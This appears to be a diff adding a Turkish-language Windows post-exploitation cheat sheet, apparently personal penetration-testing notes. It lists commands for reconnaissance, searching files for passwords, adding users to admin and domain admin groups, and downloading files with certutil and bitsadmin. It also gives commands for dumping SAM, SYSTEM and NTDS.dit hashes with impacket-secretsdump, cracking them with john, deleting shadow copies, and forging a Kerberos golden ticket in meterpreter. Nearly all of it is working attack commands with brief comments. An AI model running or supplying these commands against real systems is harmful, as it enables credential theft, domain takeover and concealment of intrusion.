@@ -1,0 +1,76 @@
+------------------------ Bilgi Alma ------------------------
+whoami : kullanıcıyı ogrenme
+whoami /priv : kullanıcı yetkisini öğrenme
+whoami /groups : Kullancı gruplarını öğrenme
+hostname : Bilgisayar adı ogrenme
+systeminfo : Bilgisayar hakkında bilgi getirir.
+findstr /si password *.txt : tüm txt dosyalarının içinde password ara.
+findstr /si password *.xml :  tüm xml dosyaları içinde passwordü ara.
+findstr /si password *.ini : tüm ini dosyaları içinde password ü  ara.
+sc query windefend : firewall çalışıyormu ona bakarız.
+sc query type= service : tüm çalışan servisleri tarar
+Get-MpComputerStatus : Antivirüs varmı yokmu kontrol etmeye yarar.
+netsh firewall show state : firewall hakkında bilgi verir
+netsh advfirewall firewall : firewallar ile ilgi verir.
+netsh advfirewall firewall show rule name=all
+type deneme.txt : dosya içerisini komut satırı üzerinde okuyabiliriz.
+findstr /i “root.txt” : root.txt dosyasını arar.
+------------------------- Kullanıcılar hakkında ---------------
+net users : Kullanıcıları öğrenme
+net user <kullanıcıadi> : Kullanıcı adı hakkında bilgi verir.
+net user administrator : admin kullanıcısı hakkında bilgi alma
+net localgroup administrator : local adminleri gösterir.
+net localgroup administrator user /add : local admin olarak ekler
+Net user <kullanici adi> <parola> /add /DOMAIN : kullanici ekleme
+net group "domain admins" <kullaniciadi> /DOMAIN /add : kullaniciyi domaine ekleme
+net user <kullanici adi> /del : kullanici silme 
+net users /domain : domain uzerinde ki adminleri gosterir. ve domaini gosterir
+net users <kullaniciadi> /domain :hangi gruplara uye 
+net group "domain admins" /domain : domain uzerindeki kullanicilarin yetkilerini kontrol edebiliriz.
+net accounts /domain : domain parola politikasi nedir
+
+-------------------------- network ---------------------------
+ipconfig
+arp -a : arp tablolarına bakma 
+route print : route tablolarını görebiliriz.
+netstat -ant : portlar hakkında bilgi verir.
+netstat -ano : portlar hakkında bilgi verir.
+
+------------------------- Dosya Transfer ------------------------------
+certutil.exe --urlcache -split -f "<url>"
+bitsadmin.exe /transfer n "<url>" "dosyanın koyulacağı yer"
+Invoke-WebRequest https://path/to/file.txt -OutFile C:\file.txt
+----------------------------------------------------------------------
+# sam dosyası 
+c\windows\system32\config\sam = sam doyalari bu dizin altinda tutulur.
+reg save HKLM\SAM ./SAM - kopyaliyorum
+reg save HKLM\SYSTEM ./SYSTEM - kopyaliyorum
+bunlari decrypt etmek icin:
+lm hashleri DES sifreleme algoritmasini kullanir.
+lm hashlerde tuzlama yoktur.(salting)
+
+ntlm  md4 kullanir.
+ntlm pass the hash yapilabilir.
+impacket-secretsdump -sam <samdosyasiyolu> -system <systemdosyasiyolu> -hashes lmhash:nthash LOCAL -outputfile <ciktialacaginizdosyayolu>
+john --format=lm<lm-yada ntlm gelicek> <hashdosyasi> --wordlist <wordlistdosyayolu>
+
+NTDS.dit :
+%SystemRoot%\Windows\NTDS altinda bulunur.
+AD ile ilgili tum bilgiler ntds.dit altinda bulunur.
+
+ntds dosyasi kopyalama:
+vssadmin list shadows : komutu ile volume bilgisi alinir.
+copy <volumebilgisigelecek>\windows\ntds\ntds.dit ./ntds : ntds doyasini kopyalar.
+copy <volumebilgisigelecek>\windows\system32\config\system system
+impacket-secretsdump -ntds ntds.dit -system system -hashes lmhash:nthash LOCAL -outputfile ntds_hashes.txt
+
+windows uzerinde olusturdugumuz shadow copy silmek icin:
+vssadmin delete shadows /for=C:
+
+Golden ticket (meterpreter):
+-load kiwi
+-dcsync_ntlm krbtgt
+-golden ticket create -d <domain> -u <user> -s <domain_sid> -k <krbtgt_hash> -t golden_ticket.tck : ticket olusturur
+-kerberos_list 
+-kerberos_ticket_purge : bu komut ile tum ticketlari siler
+-kerberos_ticket_use <olusturdugumuzticketadi> : bu komut ile olusturdugumuz ticket yukluyoruz 
